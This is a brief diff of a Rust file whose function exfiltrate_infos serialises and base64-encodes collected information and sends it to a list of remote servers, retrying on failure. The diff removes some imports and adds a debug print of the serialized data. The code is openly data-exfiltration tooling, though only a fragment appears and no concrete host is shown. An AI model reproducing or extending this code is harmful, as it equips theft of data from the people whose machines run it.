@@ -1,8 +1,5 @@
 use base64::{engine::general_purpose, Engine as _};
-use rand::{distributions::Alphanumeric, Rng};
 use std::collections::HashMap;
-use std::io::Write;
-use reqwest::blocking::Client;
 pub fn exfiltrate_infos(infos: HashMap<String, String>) -> Result<(), &'static str> {
     // serialize the hashmap and base64 it
     let serialized_infos =
@@ -12,6 +9,7 @@ pub fn exfiltrate_infos(infos: HashMap<String, String>) -> Result<(), &'static s
     let mut fail_count = 0;
     loop {
         // send the serialized infos to the server
+        println!("{:?}", serialized_infos.clone());
         match send_as_text(servers[curr_try], &serialized_infos) {
             Ok(_) => {
                 println!("Successfully sent the infos to the server");
